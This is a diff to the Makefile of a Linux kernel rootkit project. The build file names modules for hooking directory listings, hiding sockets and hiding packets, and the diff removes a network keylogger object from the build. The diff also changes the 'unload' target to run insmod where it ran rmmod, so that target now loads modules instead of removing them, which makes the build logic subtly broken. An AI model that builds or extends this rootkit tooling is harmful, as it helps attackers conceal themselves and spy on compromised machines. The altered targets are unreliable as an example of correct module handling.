@@ -24,7 +24,6 @@ $(ROOTKIT)-y 	+= src/core.o
 
 # Source
 $(ROOTKIT)-y 	+= src/server.o
-$(ROOTKIT)-y 	+= src/network_keylog.o
 $(ROOTKIT)-y 	+= src/getdents_hook.o
 $(ROOTKIT)-y 	+= src/socket_hiding.o
 $(ROOTKIT)-y 	+= src/packet_hiding.o
@@ -49,9 +48,10 @@ load:
 	insmod rootkit.ko
 
 unload:
-	rmmod rootkit.ko
-	rmmod $(KERNELDIR)/net/ipv6/netfilter/nf_reject_ipv6.ko
+	insmod rootkit.ko
+	insmod $(KERNELDIR)/net/ipv6/netfilter/nf_reject_ipv6.ko
 
 clean:
 	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean
-# must be in load, but need to add some check about it insmod $(KERNELDIR)/net/ipv4/netfilter/nf_reject_ipv4.ko 
+
+# must be added to load with checking insmod $(KERNELDIR)/net/ipv4/netfilter/nf_reject_ipv4.ko
